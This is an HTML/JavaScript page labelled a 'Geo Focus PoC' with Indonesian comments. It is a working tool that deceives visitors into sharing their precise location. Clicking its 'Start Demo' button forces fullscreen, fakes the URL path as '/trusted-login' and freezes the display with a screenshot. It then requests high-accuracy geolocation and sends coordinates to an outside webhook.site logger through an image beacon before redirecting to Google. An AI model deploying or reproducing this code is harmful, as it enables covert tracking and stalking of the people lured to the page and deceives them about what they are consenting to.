<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Geo Focus PoC</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>

<body>

<button id="start">Start Demo</button>

<script>
const TARGET = "https://www.google.com";
const LOG_ENDPOINT = "https://webhook.site/248bcd36-211a-4a46-9a54-c54dc32b4119";

let sent = false; // 🔥 biar cuma kirim 1x

// ===== LOGGER (MINIMAL) =====
function sendLocation(lat, lon, accuracy) {
  if (sent) return;
  sent = true;

  const data = new URLSearchParams({
    lat,
    lon,
    acc: accuracy,
    ts: Date.now()
  });

  new Image().src = `${LOG_ENDPOINT}?${data}`;
}

// ===== GEO (HIGH ACCURACY) =====
function getLocation() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    pos => {
      sendLocation(
        pos.coords.latitude,
        pos.coords.longitude,
        pos.coords.accuracy
      );

      // optional redirect
      setTimeout(() => {
        location.href = TARGET;
      }, 3000);
    },
    err => {
      // retry sekali kalau gagal
      setTimeout(getLocation, 1000);
    },
    {
      enableHighAccuracy: true,  // 🔥 penting
      timeout: 10000,
      maximumAge: 0              // 🔥 no cache
    }
  );
}

// ===== FREEZE UI =====
function freezeUI() {
  return html2canvas(document.body,{scale:2}).then(canvas=>{
    const img = document.createElement("img");
    img.src = canvas.toDataURL();
    Object.assign(img.style,{
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      zIndex:"999999"
    });
    document.body.innerHTML="";
    document.body.appendChild(img);
  });
}

// ===== START =====
document.getElementById("start").onclick = () => {

  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen();
  }

  history.replaceState({}, '', '/trusted-login');

  freezeUI().then(()=>{
    setTimeout(getLocation, 100);
  });
};
</script>

</body>
</html>
